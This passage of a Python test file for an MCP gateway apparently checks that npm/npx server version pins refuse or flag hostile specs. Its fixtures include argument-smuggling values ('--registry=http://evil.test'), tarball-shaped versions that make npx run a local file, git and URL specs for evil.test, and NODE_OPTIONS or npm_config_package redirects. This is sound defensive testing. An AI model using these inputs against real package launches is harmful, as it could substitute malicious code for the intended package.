        '"v3.25.5"',  # not SemVer
        "3.25",  # YAML float
        '"3.25"',
        '"3.25.5 --registry=http://evil.test"',
        '"evil-pkg@1.0.0"',  # an attempt to name a different package
        '"npm:evil-pkg@1.0.0"',
        '"../../tmp/x"',
        '""',
        "true",
        '"3.25.5+evil"',  # build metadata: npm ignores it, reports would echo it
        # SemVer-shaped tarballs: npa checks isFileType BEFORE reading a version,
        # so each of these makes npx run a LOCAL FILE (round 3, B1').
        '"3.25.5-evil.tgz"',
        '"1.0.0-x.TAR"',
        '"1.0.0-a.tar.gz"',
        '"1.2.3-X.Tar.Gz"',
        # npm 10's isFileType (npm-package-arg 12.x) has an unescaped dot in
        # `tar.gz`, so `tar-gz` is a tarball too; main's rule follows it.
        '"1.0.0-x.tar-gz"',
        # A core part above 2**53-1 is a dist-TAG to npm, not a version.
        '"9007199254740992.0.0"',
    ],
)
def test_server_version_refuses_anything_but_one_exact_version(
    raw: str, caplog: pytest.LogCaptureFixture
) -> None:
    shipped = load_manifest().servers["firecrawl"]
    _user_overlay(f"server_version:\n  firecrawl: {raw}\n")

    with caplog.at_level(logging.WARNING):
        entry = load_manifest().servers["firecrawl"]

    assert entry.version is None
    assert entry.args == shipped.args
    assert entry.install == shipped.install
    assert any("firecrawl" in m and "server_version" in m for m in _warnings(caplog))


def test_server_version_cannot_create_a_server(
    caplog: pytest.LogCaptureFixture,
) -> None:
    _user_overlay('server_version:\n  no-such-server: "1.0.0"\n')

    with caplog.at_level(logging.WARNING):
        manifest = load_manifest()

    assert "no-such-server" not in manifest.servers
    assert any("no-such-server" in m for m in _warnings(caplog))


def test_unapproved_project_server_version_contributes_nothing(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    overlay = tmp_path / "proj" / ".pmcp" / "manifest.yaml"
    overlay.parent.mkdir(parents=True)
    overlay.write_text('server_version:\n  firecrawl: "3.25.5"\n')
    monkeypatch.chdir(tmp_path / "proj")

    entry = load_manifest().servers["firecrawl"]

    assert entry.version is None
    assert entry.args == ["-y", "firecrawl-mcp"]


def test_approved_project_server_version_applies(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, approve_project_file: Any
) -> None:
    overlay = tmp_path / "proj" / ".pmcp" / "manifest.yaml"
    overlay.parent.mkdir(parents=True)
    overlay.write_text('server_version:\n  firecrawl: "3.25.5"\n')
    approve_project_file(overlay)
    monkeypatch.chdir(tmp_path / "proj")

    assert load_manifest().servers["firecrawl"].args == ["-y", "firecrawl-mcp@3.25.5"]


def test_version_on_a_uvx_server_is_refused_with_the_escape_hatch(
    caplog: pytest.LogCaptureFixture,
) -> None:
    shipped = load_manifest().servers["fetch"]
    assert shipped.command == "uvx"
    _user_overlay('server_version:\n  fetch: "1.0.0"\n')

    with caplog.at_level(logging.WARNING):
        entry = load_manifest().servers["fetch"]

    assert entry.version is None
    assert entry.args == shipped.args
    assert any("npx" in m and ".mcp.json" in m for m in _warnings(caplog))


def test_version_is_refused_when_an_install_argv_names_another_package(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """Pinning args but not install would approve X and run latest."""
    _user_overlay(
        """
servers:
  split-brain:
    description: "args and install disagree"
    keywords: [s]
    install:
      linux: ["npx", "-y", "other-mcp"]
    command: "npx"
    args: ["-y", "split-mcp"]
server_version:
  split-brain: "1.0.0"
"""
    )

    with caplog.at_level(logging.WARNING):
        entry = load_manifest().servers["split-brain"]

    assert entry.version is None
    assert entry.args == ["-y", "split-mcp"]
    assert entry.install == {"linux": ["npx", "-y", "other-mcp"]}


# One case per npm-package-arg class that is NOT a registry version/tag
# (the plan's class table). Round 2 (B1) found the tarball class missing: every
# earlier file/URL case carried a `:` prefix, which the old regex excluded
# anyway, so no test exercised a letter-led tarball.
_NON_PLAIN_SLOTS = {
    "alias": "myalias@npm:firecrawl-mcp@3.25.5",
    "url": "t@https://evil.test/t.tgz",
    "git-url": "t@git+https://evil.test/t.git",
    "hosted-shortcut": "t@github:evil/x",
    "hosted-path": "t@evil/x",
    "git-ssh": "t@git@github.com:evil/x",
    "file-prefix": "t@file:../evil",
    "relative-dir": "t@../evil",
    "home-dir": "t@~/evil",
    "absolute-dir": "t@/abs/evil",
    "tarball-tgz": "t@corp.tgz",
    "tarball-TGZ-mixed": "firecrawl-mcp@corp-mcp.TGZ",
    "tarball-tar": "t@x.tar",
    "tarball-tar.gz": "t@x.tar.gz",
    "tarball-Tar.Gz": "@s/p@X.Tar.Gz",
    "bare-tarball-tgz": "corp.tgz",
    "bare-tarball-TAR": "x.TAR",
    "tarball-name-with-version": "corp.tgz@3.25.5",
    "range-caret": "t@^3.25.0",
    "range-gte": "t@>=1.0.0",
    "range-x": "t@x",
    "range-X": "t@X",
    "range-v-partial": "t@v1.2.x",
    "tag-trailing-newline": "t@latest\n",
    "not-uri-safe-tag": "t@tag!",
    # Round 3 (B1'): a strict-SemVer selector with a tarball tail is a FILE to
    # npa, which checks isFileType before it reads a version. A fixed,
    # node-free sample of the generated corpus's classes (Verification step 10).
    "semver-tarball-prerelease": "firecrawl-mcp@3.25.5-corp.tgz",
    "semver-tarball-TAR": "t@1.0.0-x.TAR",
    "semver-tarball-build": "t@3.25.5+b.tar.gz",
    "semver-tarball-scoped": "@s/p@1.2.3-X.Tar.Gz",
    "semver-tarball-npm10-tar-gz": "t@1.0.0-x.tar-gz",
    "tarball-npm10-tar-gz": "t@corp.tar-gz",
    "oversized-core-is-a-tag": "t@9007199254740992.0.0",
    # Round 3 (N-a): loose SemVer allows any run of leading v's.
    "range-vv": "t@vv1",
    "range-vvX": "t@vvX",
    "range-v-xbeta": "t@v1.X.xbeta",
    "version-vv": "t@vv1.2.3",
    # Round 3 (N-c): validate-npm-package-name's exclusion list, any case.
    "excluded-node_modules": "node_modules",
    "excluded-Node_Modules-versioned": "Node_Modules@1.0.0",
    "excluded-favicon": "favicon.ico@latest",
}


def _odd_slot_overlay(slot: str, version: str = "3.25.5") -> None:
    _user_overlay(
        yaml.safe_dump(
            {
                "servers": {
                    "odd-slot": {
                        "description": "odd slot",
                        "keywords": ["o"],
                        "install": {"linux": ["npx", "-y", slot]},
                        "command": "npx",
                        "args": ["-y", slot],
                        "version": version,
                    }
                }
            }
        )
    )


@pytest.mark.parametrize(
    "slot", list(_NON_PLAIN_SLOTS.values()), ids=list(_NON_PLAIN_SLOTS)
)
def test_version_refuses_a_slot_that_is_not_a_plain_registry_spec(
    slot: str, caplog: pytest.LogCaptureFixture
) -> None:
    """Only ``name`` or ``name@<version-or-tag>`` may have its version replaced."""
    _odd_slot_overlay(slot)

    with caplog.at_level(logging.WARNING):
        entry = load_manifest().servers["odd-slot"]

    assert split_plain_registry_spec(slot) is None
    assert entry.version is None
    assert entry.args == ["-y", slot]
    assert entry.install == {"linux": ["npx", "-y", slot]}
    assert any("plain registry" in m for m in _warnings(caplog))


@pytest.mark.parametrize(
    ("slot", "pinned"),
    [
        ("t", "t@3.25.5"),  # npa: registry range `*`
        ("t@1.0.0", "t@3.25.5"),  # npa: version
        ("t@1.0.0-rc.1", "t@3.25.5"),
        ("t@next", "t@3.25.5"),  # npa: tag
        ("t@beta-2.tgzx", "t@3.25.5"),  # tag: `.tgzx` is not a tarball suffix
        ("@s/p", "@s/p@3.25.5"),
        ("@s/p.tgz", "@s/p.tgz@3.25.5"),  # a SCOPED name is never a file to npa
        ("@s/p@latest", "@s/p@3.25.5"),
    ],
)
def test_version_pins_every_plain_registry_class(slot: str, pinned: str) -> None:
    _odd_slot_overlay(slot)

    entry = load_manifest().servers["odd-slot"]

    assert entry.args == ["-y", pinned]
    assert entry.version == "3.25.5"


def test_version_replaces_a_dist_tag_slot() -> None:
    """A dist-tag is part of the plain-registry grammar and is replaced."""
    _user_overlay(
        """
servers:
  tagged:
    description: "tagged"
    keywords: [t]
    install:
      linux: ["npx", "-y", "tagged-mcp@next"]
    command: "npx"
    args: ["-y", "tagged-mcp@next"]
    version: "1.0.0"
"""
    )

    assert load_manifest().servers["tagged"].args == ["-y", "tagged-mcp@1.0.0"]


@pytest.mark.parametrize(
    "shape",
    [
        'command: "npx"\n    args: ["-y", 123]',
        'command: "npx"\n    args: ["-y", "ok-mcp"]\n    install:\n      linux: ["npx", "-y", 123]',
        'command: 123\n    args: ["-y", "ok-mcp"]',
    ],
)
def test_a_pin_on_a_malformed_entry_costs_only_that_entry(
    shape: str, caplog: pytest.LogCaptureFixture
) -> None:
    """HEAD loads every entry of this overlay; the pin must not change that."""
    shipped_count = len(load_manifest().servers)
    _user_overlay(
        f"""
servers:
  malformed:
    description: "non-string argv"
    keywords: [m]
    {shape}
    version: "1.2.3"
"""
    )

    with caplog.at_level(logging.WARNING):
        manifest = load_manifest()  # must not raise

    assert len(manifest.servers) == shipped_count + 1
    assert manifest.servers["malformed"].version is None
    assert manifest.servers["firecrawl"].args == ["-y", "firecrawl-mcp"]
    assert any("malformed" in m for m in _warnings(caplog))


def test_a_config_entry_without_a_command_inherits_the_pin() -> None:
    _user_overlay('server_version:\n  firecrawl: "3.25.5"\n')
    manifest_servers = load_manifest().servers

    merged = _merge_manifest_defaults(
        "firecrawl", LocalMcpServerConfig(command="", args=[]), manifest_servers
    )

    assert merged is not None
    assert merged.args == ["-y", "firecrawl-mcp@3.25.5"]


def test_explicit_config_args_win_over_the_manifest_pin() -> None:
    """``.pmcp.json`` with its own command/args is the operator's override."""
    _user_overlay('server_version:\n  firecrawl: "3.25.5"\n')
    manifest_servers = load_manifest().servers

    merged = _merge_manifest_defaults(
        "firecrawl",
        LocalMcpServerConfig(command="npx", args=["-y", "firecrawl-mcp@3.20.0"]),
        manifest_servers,
    )

    assert merged is not None
    assert merged.args == ["-y", "firecrawl-mcp@3.20.0"]


# ---------------------------------------------------------------------------
# Harness for the handler tests
# ---------------------------------------------------------------------------


class _ClientManager:
    def __init__(self, statuses: list[ServerStatus] | None = None) -> None:
        self._statuses = statuses or []

    def get_all_tools(self) -> list[Any]:
        return []

    def get_server_status(self, name: str) -> None:
        return None

    def get_all_server_statuses(self) -> list[ServerStatus]:
        return list(self._statuses)

    def get_registry_meta(self) -> tuple[str, float]:
        return ("test-rev", 0.0)

    def get_connected_configs(self) -> dict[str, ResolvedServerConfig]:
        return dict(self.connected)

    connected: dict[str, ResolvedServerConfig] = {}


def _server(
    name: str,
    args: list[str],
    *,
    relaxer_value: str | None = "http://self-hosted.internal:3002",
    **extra: Any,
) -> ServerConfig:
    return ServerConfig(
        name=name,
        description=name,
        keywords=[name],
        install={p: ["npx", *args] for p in PLATFORMS},
        command="npx",
        args=list(args),
        requires_api_key=True,
        env_var="SELFHOST_API_KEY",
        api_key_optional_when=["SELFHOST_API_URL"],
        extra_env={"SELFHOST_API_URL": relaxer_value} if relaxer_value else {},
        **extra,
    )


def _gateway(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    servers: dict[str, ServerConfig],
    *,
    configured: list[ResolvedServerConfig] | None = None,
    online: list[str] | None = None,
) -> GatewayTools:
    manifest = Manifest(
        version="1.0",
        cli_alternatives={},
        servers=dict(servers),
        discovery_queue_path=".mcp-gateway/discovery_queue.json",
    )
    monkeypatch.setattr(handlers_module, "load_manifest", lambda: manifest)
    monkeypatch.setattr(handlers_module, "load_configs", lambda **_: configured or [])
    policy_path = tmp_path / "gateway-policy.yaml"
    policy_path.write_text("servers: {}\n")
    statuses = [
        ServerStatus(name=n, status=ServerStatusEnum.ONLINE, tool_count=0)
        for n in (online or [])
    ]
    manager = _ClientManager(statuses)
    # What the gateway connected each online server with: the configured entry
    # when there is one, else the manifest's -- as startup resolution picks.
    by_name = {c.name: c for c in configured or []}
    manager.connected = {
        n: by_name.get(n) or manifest_server_to_config(servers[n])
        for n in (online or [])
    }
    gateway = GatewayTools(
        client_manager=cast(Any, manager),
        policy_manager=PolicyManager(policy_path=policy_path),
    )
    cast(Any, gateway)._platform = "linux"
    return gateway


def _latest(monkeypatch: pytest.MonkeyPatch, version: str | None) -> list[list[str]]:
    """Stub the registry lookup; record the args it was asked about."""
    asked: list[list[str]] = []

    async def fake(
        command: str, args: list[str], env: Any, cwd: Any, timeout: float = 10.0
    ) -> tuple[str | None, str]:
        asked.append(list(args))
        return (version, "npm")

    monkeypatch.setattr(handlers_module, "get_package_version", fake)
    return asked


def _no_probe(monkeypatch: pytest.MonkeyPatch, gateway: GatewayTools) -> list[Any]:
    probes: list[Any] = []

    async def probe(command: list[str], env: Any = None) -> tuple[bool, str]:
        probes.append(list(command))
        return (False, "probe output")

    monkeypatch.setattr(gateway, "_run_update_probe_command", probe)
    return probes


# ---------------------------------------------------------------------------
# Proposal 1 -- update_server reports "pinned at X, newer available: Y"
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_update_server_reports_a_newer_version_for_a_pinned_server(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    gateway = _gateway(
        monkeypatch, tmp_path, {"fc": _server("fc", ["-y", "fc-mcp@3.25.5"])}
    )
    asked = _latest(monkeypatch, "3.26.0")
    probes = _no_probe(monkeypatch, gateway)

    result = await gateway.update_server({"server_name": "fc"})

    assert result.ok is False
    assert probes == []  # a pinned server is never probed or moved
    assert asked == [["-y", "fc-mcp@3.25.5"]]
    assert (result.pinned_version, result.latest_available) == ("3.25.5", "3.26.0")
    assert result.latest_comparison == "newer"
    assert "is pinned to '3.25.5' in the manifest entry" in result.message
    assert "newer available: 3.26.0" in result.message


@pytest.mark.asyncio
async def test_update_server_says_up_to_date_when_the_pin_is_latest(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    gateway = _gateway(
        monkeypatch, tmp_path, {"fc": _server("fc", ["-y", "fc-mcp@3.25.5"])}
    )
    _latest(monkeypatch, "3.25.5")

    result = await gateway.update_server({"server_name": "fc"})

    assert result.latest_comparison == "not_newer"
    assert "up to date" in result.message
    assert "newer available" not in result.message


@pytest.mark.asyncio
async def test_update_server_says_so_when_latest_is_unknown(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    gateway = _gateway(
        monkeypatch, tmp_path, {"fc": _server("fc", ["-y", "fc-mcp@3.25.5"])}
    )
    _latest(monkeypatch, None)

    result = await gateway.update_server({"server_name": "fc"})

    assert (result.pinned_version, result.latest_available) == ("3.25.5", None)
    assert result.latest_comparison is None
    assert "latest version could not be determined" in result.message


# ---------------------------------------------------------------------------
# Proposal 2 -- unpinned client against a self-hosted backend
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_health_warns_when_a_self_hosted_backend_client_is_unpinned(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    gateway = _gateway(
        monkeypatch, tmp_path, {"fc": _server("fc", ["-y", "fc-mcp"])}, online=["fc"]
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "SELFHOST_API_URL" in info.warnings[0]
    assert "unpinned" in info.warnings[0]
    assert "server_version" in info.warnings[0]


@pytest.mark.asyncio
async def test_health_treats_latest_as_unpinned(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "fc-mcp@latest"])},
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1


@pytest.mark.asyncio
async def test_health_is_silent_when_the_relaxer_is_not_active(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    """Vendor-hosted (no self-hosted URL): unpinned is the intended default."""
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "fc-mcp"], relaxer_value=None)},
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert info.warnings == []


@pytest.mark.asyncio
async def test_health_is_silent_when_the_client_is_pinned(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "fc-mcp@3.25.5"], version="3.25.5")},
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert info.warnings == []


@pytest.mark.asyncio
async def test_health_judges_the_configured_entry_not_the_manifest(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    """The ViperJuice/dotfiles#325 shape: ``.pmcp.json`` pins with explicit args."""
    configured = ResolvedServerConfig(
        name="fc",
        source="user",
        config=LocalMcpServerConfig(
            command="npx",
            args=["-y", "fc-mcp@3.25.5"],
            env={"SELFHOST_API_URL": "http://self-hosted.internal:3002"},
        ),
    )
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "fc-mcp"])},
        configured=[configured],
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert info.warnings == []


@pytest.mark.parametrize(
    "spec", ["fc-mcp@^3.25.5", "fc-mcp@~3.25.5", "fc-mcp@3.x", "fc-mcp@next"]
)
@pytest.mark.asyncio
async def test_health_warns_on_a_range_or_dist_tag(
    spec: str, monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    """A range or tag re-resolves at every spawn: it is not a pin."""
    gateway = _gateway(
        monkeypatch, tmp_path, {"fc": _server("fc", ["-y", spec])}, online=["fc"]
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "floats on" in info.warnings[0]


@pytest.mark.asyncio
async def test_health_warns_when_the_relaxer_comes_from_the_gateway_environment(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    """The child inherits the gateway's env, so an exported URL is self-hosting.

    Advisory only: the credential gate still ignores the ambient value.
    """
    server = _server("fc", ["-y", "fc-mcp"], relaxer_value=None)
    monkeypatch.setenv("SELFHOST_API_URL", "http://self-hosted.internal:3002")
    gateway = _gateway(monkeypatch, tmp_path, {"fc": server}, online=["fc"])

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "SELFHOST_API_URL" in info.warnings[0]
    # The gate is unchanged: it never reads os.environ (#124).
    assert credential_requirement(server).required is True


@pytest.mark.asyncio
async def test_health_loads_the_manifest_once_until_a_source_changes(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    gateway = _gateway(
        monkeypatch, tmp_path, {"fc": _server("fc", ["-y", "fc-mcp"])}, online=["fc"]
    )
    loaded = handlers_module.load_manifest
    loads: list[int] = []

    def counting() -> Manifest:
        loads.append(1)
        return loaded()

    monkeypatch.setattr(handlers_module, "load_manifest", counting)

    for _ in range(3):
        health = await gateway.health()
    assert len(loads) == 1
    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1  # the cached answer is still an answer

    _user_overlay("server_env: {}\n")  # a manifest source changed on disk
    await gateway.health()
    assert len(loads) == 2


def test_fingerprint_changes_when_a_project_overlay_appears(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    project = tmp_path / "proj"
    (project / ".pmcp").mkdir(parents=True)
    monkeypatch.chdir(project)
    before = manifest_sources_fingerprint()

    (project / ".pmcp" / "manifest.yaml").write_text(
        'server_version:\n  firecrawl: "3.25.5"\n'
    )

    assert manifest_sources_fingerprint() != before


def test_fingerprint_changes_when_the_project_overlay_is_approved(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, approve_project_file: Any
) -> None:
    """Approval changes what loads without touching the overlay file."""
    overlay = tmp_path / "proj" / ".pmcp" / "manifest.yaml"
    overlay.parent.mkdir(parents=True)
    overlay.write_text('server_version:\n  firecrawl: "3.25.5"\n')
    monkeypatch.chdir(tmp_path / "proj")
    before = manifest_sources_fingerprint()
    assert load_manifest().servers["firecrawl"].version is None

    approve_project_file(overlay)

    assert manifest_sources_fingerprint() != before
    assert load_manifest().servers["firecrawl"].version == "3.25.5"


@pytest.fixture
def npm_identity_disabled(monkeypatch: pytest.MonkeyPatch) -> None:
    """What `npm_config_cache` in the gateway env produces: every npm argv refused."""
    from pmcp.manifest import version_checker

    def refused(*_args: Any, **_kwargs: Any) -> None:
        return None

    monkeypatch.setattr(version_checker, "_npm_package_arg", refused)
    monkeypatch.setattr(handlers_module, "_npm_package_arg", refused)
    monkeypatch.setattr(
        handlers_module,
        "get_resolver",
        lambda: _ResolverStatus("DISABLED, refusing every query (test)"),
    )


class _ResolverStatus:
    def __init__(self, summary: str) -> None:
        self._summary = summary

    def status_summary(self) -> str:
        return self._summary


@pytest.fixture
def npm_identity_refusing(monkeypatch: pytest.MonkeyPatch) -> None:
    """Identity ON, but npm's parser refuses this argv (a file/alias spec)."""
    from pmcp.manifest import version_checker

    def refused(*_args: Any, **_kwargs: Any) -> None:
        return None

    monkeypatch.setattr(version_checker, "_npm_package_arg", refused)
    monkeypatch.setattr(handlers_module, "_npm_package_arg", refused)
    monkeypatch.setattr(
        handlers_module, "get_resolver", lambda: _ResolverStatus("active (npm 11.19.0)")
    )


def test_a_tarball_shaped_version_is_never_an_exact_pin() -> None:
    """The pin grammar and the warning share the exact-version check.

    npm reads `pkg@1.0.0-x.tgz` as a local tarball, so such a version is not an
    exact registry pin: not as a pin value, not as a pinned argv's version.
    """
    from pmcp.manifest.loader import _parse_version_pin
    from pmcp.tools.handlers import _is_exact_pin

    for version in ("1.0.0-x.tgz", "3.25.5-corp.TGZ", "1.0.0-a.tar", "1.0.0-b.tar.gz"):
        assert _parse_version_pin("fc", version, "server_version") is None
        assert _is_exact_pin("npm", version) is False
    assert _parse_version_pin("fc", "1.0.0-x.tgzx", "server_version") == "1.0.0-x.tgzx"
    assert _is_exact_pin("npm", "1.0.0-x.tgzx") is True  # not a tarball suffix


@pytest.mark.asyncio
async def test_health_warns_on_a_semver_tarball_argv_in_both_identity_modes(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_identity_refusing: None
) -> None:
    """Round 3 (B1'): `fc-mcp@3.25.5-evil.tgz` runs a local file; never silent."""
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "fc-mcp@3.25.5-evil.tgz"])},
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "cannot verify" in info.warnings[0]
    # N-d: identity is ON here, so the cause named is npm's parser, not "off".
    assert "npm's own parser did not identify" in info.warnings[0]
    assert "unavailable" not in info.warnings[0]


@pytest.mark.asyncio
async def test_health_fails_loud_for_an_npm_exec_launch_without_identity(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_identity_disabled: None
) -> None:
    """Round 3 (N-b): `npm exec` has no slot pmcp reads; it must not go silent."""
    server = _server("fc", ["exec", "-y", "fc-mcp"])
    server.command = "npm"
    gateway = _gateway(monkeypatch, tmp_path, {"fc": server}, online=["fc"])

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "cannot verify" in info.warnings[0]
    assert "launches with npm" in info.warnings[0]
    assert "npm package identity is unavailable" in info.warnings[0]


@pytest.mark.asyncio
async def test_health_still_warns_when_npm_identity_is_disabled(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_identity_disabled: None
) -> None:
    gateway = _gateway(
        monkeypatch, tmp_path, {"fc": _server("fc", ["-y", "fc-mcp"])}, online=["fc"]
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "is unpinned (read from the argv" in info.warnings[0]


@pytest.mark.asyncio
async def test_health_reads_an_exact_pin_structurally_when_identity_is_disabled(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_identity_disabled: None
) -> None:
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "fc-mcp@3.25.5"])},
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert info.warnings == []


@pytest.mark.asyncio
async def test_health_says_it_cannot_verify_an_unreadable_slot_without_identity(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_identity_disabled: None
) -> None:
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "-p", "other", "fc-mcp@3.25.5"])},
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "cannot verify" in info.warnings[0]


# ---------------------------------------------------------------------------
# Board round 4 (rev 6): what else can change what npm runs, per-launcher
# exactness, the launcher cause, the floating label
# ---------------------------------------------------------------------------


@pytest.fixture(params=["identity-on", "identity-off"])
def either_identity_mode(
    request: pytest.FixtureRequest, monkeypatch: pytest.MonkeyPatch
) -> str:
    """Run a test with npm identity naming the package, and with it refused."""
    if request.param == "identity-on":
        request.getfixturevalue("npm_tables")
    else:
        request.getfixturevalue("npm_identity_disabled")
    return cast(str, request.param)


_ENTRY_REDIRECTS = {
    # npm's `package` config: npx runs THAT package's bin, whatever the slot
    # says (reproduced in round 4: `firecrawl-mcp@3.25.5` ran a local 0.0.1).
    "entry-package": ("npm_config_package", "file:/srv/local-client"),
    # npm reads the prefix case-insensitively.
    "entry-registry-uppercase": ("NPM_CONFIG_REGISTRY", "http://mirror.test/"),
    "entry-call": ("npm_config_call", "other-client"),
    "entry-tag": ("npm_config_tag", "next"),
    "entry-userconfig": ("npm_config_userconfig", "/srv/other.npmrc"),
    # Round 5 N1: an existing `_npx/<hash>` tree runs without re-verification,
    # so a cache the ENTRY points elsewhere can change the bytes.
    "entry-cache": ("npm_config_cache", "/srv/shared-cache"),
    "entry-node-options": ("NODE_OPTIONS", "--require /srv/hook.js"),
    "entry-home": ("HOME", "/srv/other-home"),
    # Round 5 N3: the environment spellings of npm's proxy and CA keys.
    "entry-https-proxy": ("HTTPS_PROXY", "http://proxy.test:3128"),
    "entry-https-proxy-lower": ("https_proxy", "http://proxy.test:3128"),
    "entry-extra-ca": ("NODE_EXTRA_CA_CERTS", "/srv/ca.pem"),
}


@pytest.mark.parametrize(
    ("key", "value"), list(_ENTRY_REDIRECTS.values()), ids=list(_ENTRY_REDIRECTS)
)
@pytest.mark.asyncio
async def test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm(
    key: str,
    value: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    either_identity_mode: str,
) -> None:
    """C1, within the trust boundary: the entry's own env block (an overlay's
    ``server_env`` lands here) is the entry's to answer for."""
    server = _server("fc", ["-y", "fc-mcp@3.25.5"])
    server.extra_env[key] = value
    gateway = _gateway(monkeypatch, tmp_path, {"fc": server}, online=["fc"])

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "cannot verify" in info.warnings[0]
    assert f"the entry's env sets {key}" in info.warnings[0]


_HOST_SETTINGS = {
    "host-package": ("npm_config_package", "file:/srv/local-client"),
    "host-registry": ("NPM_CONFIG_REGISTRY", "http://mirror.test/"),
    "host-node-options": ("NODE_OPTIONS", "--require /srv/hook.js"),
    "host-https-proxy": ("HTTPS_PROXY", "http://proxy.test:3128"),
    "host-uv-override": ("UV_OVERRIDE", "/srv/overrides.txt"),
}


@pytest.mark.parametrize(
    ("key", "value"), list(_HOST_SETTINGS.values()), ids=list(_HOST_SETTINGS)
)
@pytest.mark.asyncio
async def test_the_host_environment_is_trusted(
    key: str,
    value: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    either_identity_mode: str,
) -> None:
    """Round 5 (maintainer decision): the operator's own shell environment is
    trusted, like PATH. A setting the host exports is out of scope; only the
    entry's env block, argv and launcher are judged."""
    monkeypatch.setenv(key, value)
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "fc-mcp@3.25.5"])},
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert info.warnings == []


@pytest.mark.parametrize(
    "where",
    ["user-npmrc", "cwd-npmrc", "local-prefix", "global-npmrc", "builtin-npmrc"],
)
@pytest.mark.asyncio
async def test_the_hosts_npm_configuration_files_are_trusted(
    where: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    either_identity_mode: str,
) -> None:
    """Round 5 (maintainer decision): npmrc files at every level, a local
    project, shims and global installs are the host's; revision 6's discovery
    of them is cut (its shim blind spot, round 5 B1, goes with it)."""
    if where == "user-npmrc":
        (Path.home() / ".npmrc").write_text("package=file:/srv/local-client\n")
    elif where == "cwd-npmrc":
        (Path.cwd() / ".npmrc").write_text("registry = http://mirror.test/\n")
    elif where == "local-prefix":
        (Path.cwd() / "package.json").write_text("{}\n")
    elif where == "global-npmrc":
        (tmp_path / "prefix" / "etc").mkdir(parents=True)
        (tmp_path / "prefix" / "etc" / "npmrc").write_text("tag=next\n")
        monkeypatch.setenv("PREFIX", str(tmp_path / "prefix"))
    else:
        root = tmp_path / "npm-root"
        (root / "bin").mkdir(parents=True)
        (root / "bin" / "npx-cli.js").write_text("")
        (root / "bin" / "npx-cli.js").chmod(0o755)
        (root / "npmrc").write_text("call=other-client\n")
        (tmp_path / "path-bin").mkdir()
        (tmp_path / "path-bin" / "npx").symlink_to(root / "bin" / "npx-cli.js")
        monkeypatch.setenv("PATH", f"{tmp_path / 'path-bin'}:{os.environ['PATH']}")
    gateway = _gateway(
        monkeypatch,
        tmp_path,
